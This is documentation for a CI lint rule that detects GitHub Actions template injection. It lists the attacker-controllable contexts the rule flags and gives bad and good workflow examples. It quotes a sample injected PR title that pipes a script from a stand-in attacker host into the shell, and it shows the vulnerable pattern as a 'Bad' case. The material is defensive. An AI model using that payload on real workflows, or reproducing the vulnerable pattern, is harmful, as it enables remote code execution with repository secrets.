# `github-actions-no-template-injection`

> `run:` scripts and `actions/github-script` bodies never expand attacker-controllable `${{ }}` context.

<!-- begin generated rule header -->
Runs under `@noctcore/harness`, not ESLint · Factory `createGithubActionsNoTemplateInjectionRule` from `@noctcore/lint-meta-rules` · Category `ci` · Fails CI by default: yes
<!-- end generated rule header -->

## Why

GitHub substitutes `${{ }}` into a `run:` script before the shell sees it. A PR titled
`"; curl https://evil.example/x.sh | sh #` turns `echo "${{ github.event.pull_request.title }}"`
into a command that runs with the job's `GITHUB_TOKEN` and secrets. On `pull_request_target`,
`issue_comment` or `workflow_run` that token often has write access, and anyone who can open an
issue can supply the text. The same holds for the `script:` of `actions/github-script`, which is
JavaScript built from the substituted text.

The fix is to pass the value through `env:` and read it as a variable. An environment variable is
data; the shell never parses its contents as script.

### Prior art

It mirrors zizmor's [`template-injection`](https://docs.zizmor.sh/audits/#template-injection) audit
and GitHub's
[security hardening guide](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections).

## What it flags

A `${{ }}` expression inside a `run:` value (inline, a `|` / `>` block, or a multi-line plain
scalar) or inside the `script:` input of an `actions/github-script` step, when it names one of:

- `github.event.issue.title` / `.body`, `github.event.pull_request.title` / `.body`,
  `github.event.discussion.title` / `.body`
- `github.event.pull_request.head.ref` / `.head.label`, `github.head_ref`,
  `github.event.workflow_run.head_branch`
- `github.event.comment.body`, `github.event.review.body`, `github.event.review_comment.body`
- `github.event.pages.*.page_name`
- `github.event.commits.*.message` / `.author` / `.committer`, the same under
  `github.event.head_commit` and `github.event.workflow_run.head_commit`
- `inputs.<name>` and `github.event.inputs.<name>` (option `checkInputs`, on by default), except an
  input the same file declares as `type: boolean`, `number` or `choice`
- `steps.<id>.outputs.<name>` (option `checkStepOutputs`, off by default)

Workflow files and composite actions (`action.yml` / `action.yaml` at any depth) are scanned. A
shell comment inside a block is still read: GitHub expands expressions there too. Each violation
carries the 1-indexed line.

```yaml
# Bad
- run: echo "${{ github.event.pull_request.title }}"
- uses: actions/github-script@<sha> # v7
  with:
    script: console.log(`${{ github.event.issue.body }}`)

# Good
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
- uses: actions/github-script@<sha> # v7
  env:
    BODY: ${{ github.event.issue.body }}
  with:
    script: console.log(process.env.BODY)
```

## What it does not flag

- The same expression under `env:`, `with:` (other than a github-script `script:`), `if:`,
  `name:` or `defaults.run`. Those are not parsed as script.
- Contexts nobody outside the repo controls: `github.sha`, `github.ref_name`,
  `github.event.pull_request.number`, `github.event.pull_request.head.sha`, `matrix.*`,
  `secrets.*`, `needs.*`, and `steps.*.outputs.*` unless `checkStepOutputs` is on.
- A `script:` input of any action other than `actions/github-script`.
- A YAML comment (`# run: ...`) and the trailing ` # ...` of a plain inline `run:`, which YAML
  strips before GitHub sees the value.
- Paths with a `node_modules`, `.git`, `dist`, `.turbo` or `coverage` segment.

Line-based text, not a YAML parse. An expression split across lines, the bracket form
(`github.event['issue']['title']`), `toJSON(github.event)` and a value laundered through `env.*`
set from event text are not seen. An expression that only tests a tainted field
(`${{ contains(github.event.issue.title, 'x') }}`) evaluates to a boolean but is still reported;
move the test to `if:` or into the script.

## Options

```ts
createGithubActionsNoTemplateInjectionRule(options?: GithubActionsNoTemplateInjectionOptions): IMetaRule
```

| Option | Type | Default | Meaning |
| --- | --- | --- | --- |
| `workflowGlobs` | `string[]` | `['.github/workflows/*.yml', '.github/workflows/*.yaml']` | Workflow files to scan. |
| `actionGlobs` | `string[]` | `action.yml` / `action.yaml` at any depth | Composite action metadata to scan. |
| `skipDirs` | `string[]` | `['node_modules', '.git', 'dist', '.turbo', 'coverage']` | An action path with any of these segments is skipped. |
| `checkInputs` | `boolean` | `true` | Treat `inputs.*` as attacker-controlled. A reusable workflow or composite action cannot know what its caller passes. |
| `checkStepOutputs` | `boolean` | `false` | Treat `steps.*.outputs.*` as attacker-controlled. Turn it on when steps echo event text into outputs. |
| `ciCritical` | `boolean` | `true` | Whether a violation fails CI. |

## When not to use it

If your repo has no GitHub Actions workflows or composite actions there is nothing to check. If
zizmor's `template-injection` audit already gates CI, one of the two is enough.
